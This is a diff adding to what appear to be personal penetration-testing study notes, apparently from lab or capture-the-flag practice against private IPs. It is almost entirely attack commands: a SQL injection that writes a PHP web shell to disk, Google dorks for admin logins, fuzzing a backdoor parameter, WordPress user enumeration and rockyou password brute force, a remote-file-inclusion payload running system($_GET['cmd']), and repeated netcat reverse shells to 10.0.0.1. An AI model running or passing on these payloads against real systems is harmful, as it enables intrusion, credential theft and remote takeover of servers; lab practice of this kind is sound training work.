@@ -85,6 +85,60 @@ day23
 Blind Base
 	-Boolean
 	-Time
-
-
 id=1' and 11<4--+&Submit=Submit
+
+day 24
+
+--
+get shell 
+192.168.0.145/admin/edit.php?id=-1 union select 1,2,3,'<?php system($_GET[0]);?>' into outfile '/var/www/css/shell.php'--
+
+Google Dork
+
+inurl:value  (eg. inurl:"login.php")
+site:com.mm
+filetype:pptx"Web Security"
+intitle: "admin login"
+
+day25
+terminal>wfuzz -w /usr/share/wordlists/dirb/common.txt --hw 0 http://192.168.0.198/test/bd.php?FUZZ=ls
+
+browser>192.168.0.198/test/bd.php?cmd=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+
+if not work use https://www.urlencoder.org/  >>(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f)
+cat /etc/passwd
+cat /etc/*release
+
+So Simple
+terminal>gobuster dir -u "http://192.168.0.180" -w /usr/share/wordlists/dirb/common.txt
+
+terminal>wpscan --url http://192.168.0.180/wordpress/ -e u
+terminal>wpscan --url http://192.168.0.180/wordpress/ -U max -P /usr/share/wordlists/rockyou.txt
+terminal>wpscan --url http://192.168.0.180/wordpress/ -e ap
+
+
+192.168.0.180/wordpress/wp-admin/admin-post.php?swap_debug=load_options&swp_url=
+
+cd /var/www/html/test/
+subl payload.txt
+
+
+[
+<pre>
+phpinfo();
+</pre>
+]
+[
+<pre>
+system($_GET['cmd']);
+</pre>
+]
+192.168.0.180/wordpress/wp-admin/admin-post.php?swap_debug=load_options&swp_url=http://192.168.0.143/test/payload.txt
+
+192.168.0.180/wordpress/wp-admin/admin-post.php?swap_debug=load_options&swp_url=http://192.168.0.143/test/payload.txt&cmd=echo"<pre>"ls -al
+
+terminal>nc -lvp 4444
+
+192.168.0.180/wordpress/wp-admin/admin-post.php?swap_debug=load_options&swp_url=http://192.168.0.143/test/payload.txt&cmd=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
+
+if not work use https://www.urlencoder.org/  >>(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f)
